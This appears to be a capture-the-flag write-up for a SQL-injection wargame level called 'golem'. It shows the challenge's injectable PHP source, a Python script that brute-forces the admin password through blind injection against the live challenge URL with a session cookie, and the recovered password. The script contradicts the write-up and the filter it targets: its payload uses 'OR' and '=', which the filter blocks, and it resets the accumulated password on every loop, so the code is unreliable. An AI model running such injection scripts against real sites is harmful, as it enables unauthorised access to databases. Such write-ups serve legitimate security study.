
#  GOLEM
```
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and|substr\(|=/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_golem where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_golem where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("golem"); 
  highlight_file(__FILE__); 
?>
```
Using %% which denotes to match the character which is present at any position in the password.Using LIKE instead of =.

***
```
import requests
import string
characters = string.ascii_letters + string.digits
session = {
    "PHPSESSID": "dovaradinkdstego4urhvano2"
}
dbpass = ""
for i in range(1, 9):
    dbpass = ""
    for char in characters:
        paran = {
            "pw": f"OR LEFT(pw, {i}) = '{dbpass + char}' -- "
        }
        response = requests.get("https://los.rubiya.kr/chall/golem_60e5b360795c119588e4f3a86c5dd494.php", params=paran, cookies=session)
        output = response.text
        if "Hello admin" in output:
            dbpass += char
            break
print("Password:", dbpass)
```

###### password:77d6290b
 ***
####   query : select id from prob_golem where id='guest' and pw='77d6290b'.
***
